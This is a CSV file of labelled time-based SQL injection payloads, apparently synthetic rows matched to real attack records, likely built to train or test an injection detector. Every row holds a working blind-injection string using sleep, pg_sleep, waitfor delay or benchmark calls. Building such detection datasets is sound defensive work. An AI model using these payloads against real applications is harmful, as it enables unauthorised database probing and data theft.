id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000179,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,nearest_attack_euclidean,R000137,7.414695458360313
CTGAN_000180,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000161,5.8349103512937885
CTGAN_000181,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000273,6.869931536837893
CTGAN_000182,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R000119,7.3095495482103265
CTGAN_000183,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000062,6.873543908089073
CTGAN_000184,attack,time,1'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000192,6.2295836804680835
CTGAN_000185,attack,time,1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000233,7.254470123010805
CTGAN_000186,attack,time,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000082,6.702255958475158
CTGAN_000187,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000122,7.838490479179889
CTGAN_000188,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",nearest_attack_euclidean,R000156,5.805431815851605
CTGAN_000189,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,7.966558645880359
CTGAN_000190,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000265,6.527100526342597
CTGAN_000191,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",nearest_attack_euclidean,R000073,6.335013276840179
CTGAN_000192,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000007,7.431568187176075
CTGAN_000193,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000104,7.260607871751392
CTGAN_000194,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000104,7.038448162181478
CTGAN_000195,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000017,6.677508217977536
CTGAN_000196,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000076,6.678337862543728
CTGAN_000197,attack,time,1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,nearest_attack_euclidean,R000059,6.4013694760393065
CTGAN_000198,attack,time,"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  8600  =  8600",nearest_attack_euclidean,R000290,7.024412088768697
CTGAN_000199,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000104,5.524431385814901
CTGAN_000200,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000288,6.362898591093541
